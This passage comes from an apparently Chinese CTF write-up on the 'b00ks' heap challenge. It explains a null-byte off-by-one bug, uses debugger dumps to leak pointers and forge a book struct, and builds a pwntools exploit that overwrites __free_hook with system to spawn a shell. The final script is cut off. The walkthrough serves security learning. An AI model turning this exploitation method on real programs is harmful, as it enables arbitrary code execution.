class="function">__int64 __fastcall <span class="title">sub_9F5</span><span class="params">(_BYTE *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0</span> )    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, a1, <span class="number">1uLL</span>) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *a1 == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++a1;</span><br><span class="line">    <span class="keyword">if</span> ( i == a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面函数中的for循环其实执行了a2 +1次，存在null byte off-by-one 漏洞</p><p><strong>小总结</strong></p><ul><li>  作者名存放在off_202018地址的指针中，这个指针指向的空间共32字节</li><li>  图书结构体指针存放在off_202010中</li><li>  sub_9F5()存在off-by-one漏洞，在首次创建作者名或者修改作者名时，如果填写了32个字节的数据，会导致<code>\x00</code>溢出到off_202018的低位。</li></ul><h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><h4 id="1-定位输入的作者名的地址"><a href="#1-定位输入的作者名的地址" class="headerlink" title="1.定位输入的作者名的地址"></a>1.定位输入的作者名的地址</h4><p>输入32字节的任意数据后，Ctrl+C进入调试界面，定位刚才输入的字符串，有两种方式：</p><p><strong>第一种方式：</strong></p><p>作者名存放在off_202018中，因此知道代码段的基地址后，加上偏移就可找到存放作者名的指针。</p><p>vmmap查看代码段的起始地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x555555554000     0x555555556000 r-xp     2000 0      /home/yutao/Desktop/b00ks</span><br><span class="line">    0x555555755000     0x555555756000 r--p     1000 1000   /home/yutao/Desktop/b00ks</span><br><span class="line">    0x555555756000     0x555555757000 rw-p     1000 2000   /home/yutao/Desktop/b00ks</span><br><span class="line">    0x555555757000     0x555555778000 rw-p    21000 0      [heap]</span><br><span class="line">    0x7ffff79e2000     0x7ffff7bc9000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">    0x7ffff7bc9000     0x7ffff7dc9000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">    0x7ffff7dc9000     0x7ffff7dcd000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">    0x7ffff7dcd000     0x7ffff7dcf000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">    0x7ffff7dcf000     0x7ffff7dd3000 rw-p     4000 0      </span><br><span class="line">    0x7ffff7dd3000     0x7ffff7dfc000 r-xp    29000 0      /lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class="line">    0x7ffff7fe0000     0x7ffff7fe2000 rw-p     2000 0      </span><br><span class="line">    0x7ffff7ff8000     0x7ffff7ffb000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7ffff7ffb000     0x7ffff7ffc000 r-xp     1000 0      [vdso]</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 29000  /lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 2a000  /lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      </span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]</span><br></pre></td></tr></table></figure><p>第一行就是代码段的范围。0x555555554000 — 0x555555556000。</p><p>所以存放作者名指针的地址：0x555555754000 + 0x202018 = 0x555555756018</p><p>查看下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/16gx 0x555555756018</span><br><span class="line">0x555555756018:0x0000555555756040//地址0x0000000000000000</span><br><span class="line">0x555555756028:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555756038:0x00000000000000000x6161616161616161&lt;=存放的字符串</span><br><span class="line">0x555555756048:0x61616161616161610x6161616161616161</span><br><span class="line">0x555555756058:0x61616161616161610x0000000000000000</span><br><span class="line">0x555555756068:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555756078:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555756088:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p><strong>第二种方式</strong></p><p>使用pwngdb的search命令进行搜索：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search aaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">b00ks           0x555555756040 &#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span><br></pre></td></tr></table></figure><h4 id="2-泄露图书结构体指针"><a href="#2-泄露图书结构体指针" class="headerlink" title="2.泄露图书结构体指针"></a>2.泄露图书结构体指针</h4><p>接下来泄露图书结构体指针，<strong>输入命令c回到程序执行的界面</strong>，创建图书：</p><ol><li>创建book1：<ul><li>  book_size = 10</li><li>  book_name = book1_name</li><li>  description_size = 200</li><li>  description_size = book1_description</li></ul></li><li>创建book2：<ul><li>  book_size = 0x21000 = 135168</li><li>  book_name = book2_name</li><li>  description_size = 135168</li><li>  description_size = book2_description</li></ul></li></ol><p>至于为什么这么输，之后再说。</p><p>Ctrl+c回到调试界面。</p><p>book结构体的指针放在off_202010，查看下off_202010</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/16gx 0x555555756010</span><br><span class="line">0x555555756010:0x0000555555756060//地址0x0000555555756040</span><br><span class="line">0x555555756020:0x00000002000000000x0000000000000000</span><br><span class="line">0x555555756030:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555756040:0x61616161616161610x6161616161616161</span><br><span class="line">0x555555756050:0x61616161616161610x6161616161616161</span><br><span class="line">0x555555756060:0x00005555557577600x0000555555757790 &lt;= 存放的结构体的起始地址</span><br><span class="line">0x555555756070:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555756080:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p><code>0x0000555555756060</code>存放的是book1结构体的起始地址，</p><p><code>0x0000555555757768</code>存放的是book1结构体的起始地址。</p><p>作者名与book结构体指针相连，输入32字节数据后会导致book结构体地址的低位被覆盖为<code>\x00</code>，由于printf打印内容时，遇到\x00停止，因此会将book1 的结构体地址打印出来，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">4</span><br><span class="line">ID: 1</span><br><span class="line">Name: book1_name</span><br><span class="line">Description: book1_desc</span><br><span class="line">Author: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`wuUUU</span><br><span class="line">ID: 2</span><br><span class="line">Name: book2_name</span><br><span class="line">Description: book2_desc</span><br><span class="line">Author: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`wuUUU</span><br></pre></td></tr></table></figure><p>其中<code>0x0000555555757760</code>即对应`wuUUU。</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p.senline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Author: &quot;</span>)</span><br><span class="line">p.recv(<span class="number">32</span>)</span><br><span class="line">book1_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="3-覆盖原有的结构体指针"><a href="#3-覆盖原有的结构体指针" class="headerlink" title="3.覆盖原有的结构体指针"></a>3.覆盖原有的结构体指针</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/32gx 0x0000555555757760</span><br><span class="line">0x555555757760:0x00000000000000010x0000555555757670#book1</span><br><span class="line">0x555555757770:0x00005555557576900x00000000000000c8#book1</span><br><span class="line">0x555555757780:0x00000000000000000x0000000000000031#book1</span><br><span class="line">0x555555757790:0x00000000000000020x00007ffff7fbe010#book2</span><br><span class="line">0x5555557577a0:0x00007ffff7f9c0100x0000000000021000#book2</span><br><span class="line">0x5555557577b0:0x00000000000000000x0000000000020851#book2</span><br></pre></td></tr></table></figure><ul><li>  0x555555757760：book1_id</li><li>  0x555555757768：book1_name：0x0000555555757670</li><li>  0x555555757770：book1_desc：0x0000555555757690</li></ul><p>book1的结构体指针低位能够覆盖作者名的\x00，那么作者名的\x00可以覆盖结构体指针的低位呢？程序有修改作者名的功能，输入的作者名依然会放在off_202018中。book1结构体的起始地址为0x0000555555757760，那么被覆盖之后会变为0x0000555555757700.</p><p>作者名处，其中0x555555756060处已变为0x0000555555757700。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x555555756040</span><br><span class="line">0x555555756040:0x61616161616161610x6161616161616161</span><br><span class="line">0x555555756050:0x61616161616161610x6161616161616161</span><br><span class="line">0x555555756060:0x00005555557577000x0000555555776090</span><br><span class="line">0x555555756070:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555756080:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>此时程序就会去0x0000555555757700的位置寻找结构体，</p><p><img src="%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one//1616265201903.png"></p><h4 id="4-伪造结构体并泄露book2-name-book2-desc"><a href="#4-伪造结构体并泄露book2-name-book2-desc" class="headerlink" title="4.伪造结构体并泄露book2_name,book2_desc"></a>4.伪造结构体并泄露book2_name,book2_desc</h4><p>下面解释为什么book2的书名大小和书名类别大小设置为135168：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x555555554000     0x555555556000 r-xp     2000 0      /home/yutao/Desktop/b00ks</span><br><span class="line">    0x555555755000     0x555555756000 r--p     1000 1000   /home/yutao/Desktop/b00ks</span><br><span class="line">    0x555555756000     0x555555757000 rw-p     1000 2000   /home/yutao/Desktop/b00ks</span><br><span class="line">    0x555555757000     0x555555778000 rw-p    21000 0      [heap]</span><br><span class="line">    0x7ffff79e2000     0x7ffff7bc9000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">    0x7ffff7bc9000     0x7ffff7dc9000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">    0x7ffff7dc9000     0x7ffff7dcd000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">    0x7ffff7dcd000     0x7ffff7dcf000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">    0x7ffff7dcf000     0x7ffff7dd3000 rw-p     4000 0      </span><br><span class="line">    0x7ffff7dd3000     0x7ffff7dfc000 r-xp    29000 0      /lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class="line">    0x7ffff7f9c000     0x7ffff7fe2000 rw-p    46000 0      </span><br><span class="line">    0x7ffff7ff8000     0x7ffff7ffb000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7ffff7ffb000     0x7ffff7ffc000 r-xp     1000 0      [vdso]</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 29000  /lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 2a000  /lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      </span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 --xp     1000 0      [vsyscall]</span><br></pre></td></tr></table></figure><blockquote><p>   0x7ffff7f9c000     0x7ffff7fe2000 rw-p    46000 0<br>  为mmap扩展的堆空间</p></blockquote><p>根据网上其他wp说法，只有接近或者超过top_chunk的size大小的时候才会使用mmap进行扩展</p><p>如果vmmap后有mmap，就可以判断输入多大的数值了。<strong>如果像上图一样并没有mmap的标识，可以查看是否存在紫色不断变换空间大小的data段。</strong></p><p>由于关闭了aslr，所以libc.so的基地址就不会发生变化了，因为book2的结构体成员的地址所属为mmap申请的空间，由于mmap地址不变、libc.so基地址不变，就会导致book2成员变量中的地址所在位置距离libc.so的偏移不变。那么如果可以通过泄露book2结构体成员变量中的地址的话，减去这个偏移就会得到libc.so的基地址。一旦得到了libc.so的基地址，就可以利用pwntools找到一些可以利用的函数了。</p><p>说了这么多，要想达到上面的效果，就要从部署伪造的结构体开始。首先是fake_book_id，如果是替换book1，那么这个fake_book1的id就必须为1，这样才能按照第一个book的形式替代原有的book1.接下来是fake_book1_name，这里我们将指向book2_name的地址，fake_book1_desc指向book2_desc的地址。这样一来我们再一次执行打印功能的时候就会将book2_name和book2_desc的地址打印出来了。</p><p><img src="%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one//1616265224978.png"></p><p>之前的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/32gx 0x0000555555757760</span><br><span class="line">0x555555757760:0x00000000000000010x0000555555757670</span><br><span class="line">0x555555757770:0x00005555557576900x00000000000000c8</span><br><span class="line">0x555555757780:0x00000000000000000x0000000000000031</span><br><span class="line">0x555555757790:0x00000000000000020x00007ffff7fbe010</span><br><span class="line">0x5555557577a0:0x00007ffff7f9c0100x0000000000021000</span><br><span class="line">0x5555557577b0:0x00000000000000000x0000000000020851</span><br></pre></td></tr></table></figure><p>可以看到book2_name在0x00007ffff7fbe010的位置，book2_desc在0x00007ffff7f9c010的位置。</p><p>接下来查看伪造结构体前内存地址的内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/32gx 0x0000555555757700</span><br><span class="line">0x555555757700:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757710:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757720:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757730:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757740:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757750:0x00000000000000000x0000000000000031</span><br><span class="line">0x555555757760:0x00000000000000010x0000555555757670#book1</span><br><span class="line">0x555555757770:0x00005555557576900x00000000000000c8</span><br><span class="line">0x555555757780:0x00000000000000000x0000000000000031</span><br><span class="line">0x555555757790:0x00000000000000020x00007ffff7fbe010#book2</span><br><span class="line">0x5555557577a0:0x00007ffff7f9c0100x0000000000021000</span><br><span class="line">0x5555557577b0:0x00000000000000000x0000000000020851</span><br><span class="line">0x5555557577c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557577d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557577e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557577f0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>可以看到，内容全为空，接下来进行伪造，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">log.info(&quot;Prepare to construct a fake book...&quot;)</span><br><span class="line">payload = &#x27;a&#x27; * 0x70 + p64(1) + p64(book2_addr + 8) + p64(book2_addr + 8) + p64(0xffff)</span><br><span class="line">#book2_addr=0x555555757790</span><br><span class="line">edit(1, payload)</span><br><span class="line">#gdb.attach(p)</span><br></pre></td></tr></table></figure><p>其中的<code>&#39;a&#39; * 0x70</code>起填充作用，将地址填充到目标位置，可以多次调试来找出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40gx 0x0000555555758280</span><br><span class="line">0x555555758280:0x00000000000000000x00000000000000d1</span><br><span class="line">0x555555758290:0x61616161616161610x6161616161616161#填充的起始</span><br><span class="line">0x5555557582a0:0x61616161616161610x6161616161616161</span><br><span class="line">0x5555557582b0:0x61616161616161610x6161616161616161</span><br><span class="line">0x5555557582c0:0x61616161616161610x6161616161616161</span><br><span class="line">0x5555557582d0:0x61616161616161610x6161616161616161</span><br><span class="line">0x5555557582e0:0x61616161616161610x6161616161616161</span><br><span class="line">0x5555557582f0:0x61616161616161610x6161616161616161</span><br><span class="line">0x555555758300:0x00000000000000010x0000555555758398 #fake_struct</span><br><span class="line">0x555555758310:0x00005555557583980x000000000000ffff #fake_struct</span><br><span class="line">0x555555758320:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555758330:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555758340:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555758350:0x00000000000000000x0000000000000031</span><br><span class="line">0x555555758360:0x00000000000000010x0000555555758270 &lt;= #book1</span><br><span class="line">0x555555758370:0x00005555557582900x00000000000000c8 &lt;= #book1</span><br><span class="line">0x555555758380:0x00000000000000000x0000000000000031 &lt;= #book1</span><br><span class="line">0x555555758390:0x00000000000000020x00007ffff7fbe010 &lt;= #book2</span><br><span class="line">0x5555557583a0:0x00007ffff7f9c0100x0000000000021000 &lt;= #book2</span><br><span class="line">0x5555557583b0:0x00000000000000000x000000000001fc51 &lt;= #book2</span><br></pre></td></tr></table></figure><h4 id="5-计算libc基地址，freehook、system、-bin-sh地址"><a href="#5-计算libc基地址，freehook、system、-bin-sh地址" class="headerlink" title="5.计算libc基地址，freehook、system、/bin/sh地址"></a>5.计算libc基地址，freehook、system、/bin/sh地址</h4><p>得到了book2_name2的地址就可以计算libc的基地址了，<strong>上面book2_name的内容在mmap扩展的内存空间里。</strong></p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name: &quot;</span>)</span><br><span class="line">mmap_addr = u64(p.recv(<span class="number">6</span>) + <span class="string">&#x27;\x00\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p>通过调试得到libc和mmap分配的堆块之间的偏移是固定的，接下来可以使用book2_name_addr或者book2_desc_addr任意一个计算偏移，下面使用book2_name_addr计算偏移：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">book2_name - libc_addr = 0x00007ffff7fbe010 -  0x7ffff79e2000 = 0x5dc010</span><br></pre></td></tr></table></figure><p>或者直接这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc_addr = 0x7ffff79e2000</span><br></pre></td></tr></table></figure><p>在之后：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">free_hook = libc.symbols[<span class="string">&quot;__free_hook&quot;</span>] + libc_addr</span><br><span class="line">system = libc.symbols[<span class="string">&quot;system&quot;</span>] + libc_addr</span><br><span class="line">binsh = libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>() + libc_addr</span><br><span class="line"></span><br><span class="line">payload2 = p64(binsh) + p64(free_hook)</span><br><span class="line">edit(<span class="number">1</span>, payload2)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">payload3 = p64(system)</span><br><span class="line">edit(<span class="number">2</span>,payload3)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>payload2通过修改book1_desc来修改book2_desc指向的地址</p><p> 在这段代码中，首先是修改<code>book1_description</code>，而此时的book1是之前伪造的book2，也就是说这里的<code>book1_description_ptr</code>正好是指向<code>book2_struct</code>中的<code>book2_name_ptr</code>。通过这个修改，将<code>book2_name_ptr</code>改为了binsh字符串的地址，将<code>book2_description_ptr</code>改为了<code>free_hook</code>指针的地址。然后通过修改<code>book2_description_ptr</code>，将<code>free_hook</code>中的内容改为了<code>system()</code>的地址。之后在删除book2时，会首先调用free()释放<code>book2_name_ptr</code>指针指向的地址空间，原本的<code>free(book2_name_ptr)</code> 最终变为 <code>system(binsh_addr)</code>。</p><p>**什么是__free_hook?**举个栗子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="title">void</span> <span class="params">(*__free_hook)</span> <span class="params">(<span class="keyword">void</span> *__ptr,<span class="keyword">const</span> <span class="keyword">void</span> *)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *str = <span class="built_in">malloc</span>(<span class="number">160</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(str,<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;__free_hook: 0x%016X\n&quot;</span>,__free_hook);</span><br><span class="line">    <span class="comment">// 劫持__free_hook</span></span><br><span class="line">    __free_hook = system;</span><br><span class="line">    <span class="built_in">free</span>(str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//运行./a.out 就直接运行了system(&quot;/bin/sh&quot;)</span></span><br></pre></td></tr></table></figure><p><strong>EXP：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">name_len, name, desc_len, desc</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Enter book name size: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(name_len))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Enter book name (Max 32 chars): &quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Enter book description size: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(desc_len))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Enter book description: &quot;</span>)</span><br><span class="line">    p.sendline(desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Enter the book id you want to delete: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, desc</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Enter the book id you want to edit: 